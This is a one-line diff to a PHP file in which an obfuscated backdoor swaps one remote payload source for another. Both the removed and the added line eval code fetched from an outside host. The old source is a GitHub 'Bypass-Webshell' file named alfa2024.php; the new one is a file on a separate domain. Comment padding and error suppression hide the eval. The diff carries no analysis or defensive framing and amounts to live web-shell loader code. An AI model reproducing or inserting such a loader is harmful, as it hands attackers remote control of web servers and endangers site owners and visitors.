@@ -1,1 +1,1 @@
-<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://github.com/sagsooz/Bypass-Webshell/raw/main/alfa2024.php"));/**/?>
+<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://file.0x1999.tech/al.txt"));/**/?>
